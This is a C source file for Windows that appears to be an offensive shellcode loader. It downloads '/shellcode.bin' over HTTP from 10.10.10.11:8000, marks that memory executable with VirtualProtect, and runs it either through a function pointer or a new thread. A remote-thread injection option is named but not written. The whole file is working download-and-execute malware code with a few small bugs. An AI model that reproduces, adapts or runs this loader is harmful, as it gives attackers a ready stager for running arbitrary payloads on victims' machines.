#ifndef UNICODE
#define UNICODE
#endif

// Requires cmake:
// target_link_libraries(untitled winhttp)

#include <windows.h>
#include <strsafe.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

enum InjectionType {
    INJECTION_TYPE_FUNCTION_POINTER,
    INJECTION_TYPE_CREATE_THREAD,
    INJECTION_TYPE_CREATE_REMOTE_THREAD
};

void dprintf(
        _In_z_ _Printf_format_string_ const wchar_t* format,
        ...
) {
    va_list args;
    va_start(args, format);

    wchar_t buffer[2048];
    StringCchVPrintf(buffer, sizeof(buffer), format, args);
    OutputDebugString(buffer);
    printf("%ls", buffer);

    va_end(args);
}

void printLastError() {
    wchar_t buf[256];
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                   buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
    printf("Error: %ls\n", buf);
}

void dprintfWithLastError(
        _In_z_ _Printf_format_string_ const wchar_t* format,
        ...
) {
    va_list args;
    va_start(args, format);

    wchar_t buffer[2048];
    StringCchVPrintf(buffer, sizeof(buffer), format, args);
    OutputDebugString(buffer);
    printf("%ls\n", buffer);

    va_end(args);

    printLastError();
}

BYTE* download(LPCWSTR host, DWORD port, LPCWSTR httpPath, DWORD* dwLength) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BYTE* data = NULL;

    do {
        hSession = WinHttpOpen(
                NULL, // No user agent string
                WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0 // XXX: If using 443: WINHTTP_FLAG_SECURE_DEFAULTS // Require TLS 1.2 by default
        );

        if (!hSession) {
            dprintfWithLastError(L"failed to create session");
            break;
        }

        // Connect
        hConnect = WinHttpConnect(
                hSession,
                host,
                port,
                0 // Reserved, set as 0
        );

        if (!hConnect) {
            dprintfWithLastError(L"failed to connect");
            break;
        }

        // Create request handle
        hRequest = WinHttpOpenRequest(
                hConnect,
                L"GET",
                httpPath,
                NULL, // Use HTTP 1.1
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0 // XXX: For 443 use: WINHTTP_FLAG_SECURE
        );

        if (!hRequest) {
            dprintfWithLastError(L"failed to create request");
            break;
        }

        // Send the request
        if (!WinHttpSendRequest(
                hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, // No headers
                0, // No header length
                WINHTTP_NO_REQUEST_DATA, // No body
                0, // No optional data
                0, // 0 total length
                0 // No callbacks
        )) {
            dprintfWithLastError(L"failed to send request");
            break;
        }

        if (!WinHttpReceiveResponse(
                hRequest,
                NULL
        )) {
            dprintfWithLastError(L"Failed to receive response");
            break;
        }

        // Read all data
        DWORD dwSize = 0;
        DWORD dwTotalBufferSize = 0;
        DWORD dwReadByteCount = 0;
        do {
            dprintf(L"starting loop %d\n", dwSize);
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                dprintfWithLastError(L"failed to query available data\n");
                break;
            }

            if (dwSize == 0) {
                break;
            }

            dwTotalBufferSize += dwSize;
            dprintf(L"start realloc\n");
            if (data == NULL) {
                data = malloc(dwTotalBufferSize);
                dprintf(L"malloc location: 0x%p\n", data);
            }
            else {
                data = realloc(data, dwTotalBufferSize);
                dprintf(L"realloc location: 0x%p\n", data);
            }

            if (!data) {
                dprintfWithLastError(L"Failed to malloc %d\n", dwTotalBufferSize);
                break;
            }

            RtlZeroMemory(data + dwReadByteCount, dwSize);

            if (!WinHttpReadData(hRequest, data + dwReadByteCount, dwSize, &dwSize)) {
                dprintfWithLastError(L"Failed to read size %d\n", dwTotalBufferSize);
                free(data);
                data = NULL;
                break;
            }
            dwReadByteCount += dwSize;
        } while (dwSize > 0);

        *dwLength = dwReadByteCount;
    } while (0);

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return data;
}

void hexdump(BYTE* value, DWORD length) {
    for (int i = 0; i < length; i++) {
        dprintf(L"0x%02x ", value[i]);
        if ((i + 1) % 8 == 0) {
            dprintf(L"\n");
        }
    }
}

int injectShellcodeFromFunctionPointer(BYTE* shellcode, DWORD dwShellcodeLength) {
    // Mark shellcode as executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(
            shellcode,
            dwShellcodeLength,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
    )) {
        dprintfWithLastError(L"failed to set rwx\n");
        return 1;
    }

    (*(void(*)()) shellcode)();

    return 0;
}

int injectShellcodeFromCreateThread(BYTE* shellcode, DWORD dwShellcodeLength) {
    // Mark shellcode as executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(
            shellcode,
            dwShellcodeLength,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
    )) {
        dprintfWithLastError(L"failed to set rwx\n");
        return 1;
    }

    DWORD threadId = 0;
    HANDLE hThread = CreateThread(
            NULL, // lpThreadAttributes null for default security descriptor
            0, // Stack size - 0 for the default
            (LPTHREAD_START_ROUTINE)shellcode, // lpStartAddress
            NULL, // No parameters
            0, // No creation flags
            &threadId
    );

    if (!hThread) {
        dprintfWithLastError(L"Failed creating thread\n");
        return 1;
    }

    dprintf(L"checking if running threadId=0x%p\n", hThread);

    DWORD exitCode;
    if (!GetExitCodeThread(
            hThread,
            &exitCode
    )) {
        dprintfWithLastError(L"Failed getting exit code\n");
        return 1;
    }

    dprintf(L"Exit code %d\n", exitCode);

    dprintf(L"Waiting for thread\n");
    WaitForSingleObject(hThread, INFINITE);
    if (!CloseHandle(hThread)) {
        dprintfWithLastError(L"Failed closing handle\n");
        return 1;
    }

    dprintf(L"Finished");
}

int main() {
    DWORD dwShellcodeLength = 0;
    BYTE* shellcode = download(L"10.10.10.11", 8000, L"/shellcode.bin", &dwShellcodeLength);
    if (!shellcode) {
        printf(L"failed downloading shellcode\n");
        return 1;
    }

    dprintf(L"shellcode location: %p\n", shellcode);
    //hexdump(shellcode, dwShellcodeLength);

    enum InjectionType injectionType = INJECTION_TYPE_CREATE_THREAD;

    switch (injectionType) {
        case INJECTION_TYPE_FUNCTION_POINTER: {
            injectShellcodeFromFunctionPointer(shellcode, dwShellcodeLength);
        }
        case INJECTION_TYPE_CREATE_THREAD: {
            injectShellcodeFromCreateThread(shellcode, dwShellcodeLength);
            break;
        }
        default:
            dprintf(L"Unknown injection type");
            break;
    }
}
